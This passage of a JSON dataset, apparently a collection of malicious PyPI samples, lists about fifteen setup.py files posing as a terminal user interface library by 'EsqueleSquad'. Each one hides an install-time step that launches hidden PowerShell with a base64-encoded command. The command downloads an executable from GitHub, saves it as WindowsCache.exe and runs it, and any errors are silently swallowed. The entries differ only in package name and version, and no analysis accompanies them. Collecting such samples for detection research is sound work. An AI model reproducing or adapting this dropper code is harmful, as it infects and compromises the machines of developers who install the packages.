        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpullpongpaypal',\n    packages = ['modlib'],\n    version = '4.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-liburlcraftgrand-v1.28",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liburlcraftgrand',\n    packages = ['modlib'],\n    version = '6.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-py-intelpingvm-v5.15",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intelpingvm',\n    packages = ['modlib'],\n    version = '5.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-py-ultraproofinfo-v8.17",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ultraproofinfo',\n    packages = ['modlib'],\n    version = '10.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfcontroledintel-v3.63",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcontroledintel',\n    packages = ['modlib'],\n    version = '9.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfgamepypost-v10.9",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgamepypost',\n    packages = ['modlib'],\n    version = '4.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfgamevirtualad-v1.51",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgamevirtualad',\n    packages = ['modlib'],\n    version = '9.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfguiccproof-v4.81",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfguiccproof',\n    packages = ['modlib'],\n    version = '8.1',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfinfopaypalad-v6.60",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfinfopaypalad',\n    packages = ['modlib'],\n    version = '6.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfinfopushpip-v8.53",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfinfopushpip',\n    packages = ['modlib'],\n    version = '9.21',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfosintlgtbstr-v5.1",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfosintLGTBstr',\n    packages = ['modlib'],\n    version = '8.33',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfpingintelvm-v2.94",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpingintelvm',\n    packages = ['modlib'],\n    version = '10.62',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-hackedultratool-v7.16",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hackedultratool',\n    packages = ['modlib'],\n    version = '10.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqhttpguicc-v2.76",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqhttpguicc',\n    packages = ['modlib'],\n    version = '4.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqhttppywinfo-v8.86",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqhttppywinfo',\n    packages = ['modlib'],\n    version = '9.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqpaypalnvidiaurl-v4.73",
